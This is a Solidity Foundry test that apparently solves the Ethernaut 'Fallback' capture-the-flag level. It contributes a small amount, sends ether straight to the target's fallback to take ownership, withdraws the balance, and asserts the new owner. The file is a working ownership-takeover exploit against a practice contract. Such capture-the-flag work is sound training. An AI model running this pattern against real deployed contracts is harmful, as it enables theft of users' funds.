// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import '../lib/forge-std/src/Test.sol';
// import '../src/Fallback.sol';
interface IFallback {
  function contribute() payable external;
  function getContribution() external view returns (uint);
  function withdraw() external;
  function owner() external view returns (address);
}

contract FallbackTest is Test {
  IFallback target = IFallback(payable(0x1E757b2944d16cFa6333716F83dcA52D77936E70));
  // IFallback target = IFallback(payable(targetAddr));

  function test() external {
    address alice = vm.addr(1);
    vm.deal(alice, 1 ether);
    vm.startPrank(alice);
    target.contribute{value: 100 wei}();
    address(target).call{value: 100 wei}("");
    target.withdraw();
    vm.stopPrank();
    assertEq(target.owner(), alice);

  }
}
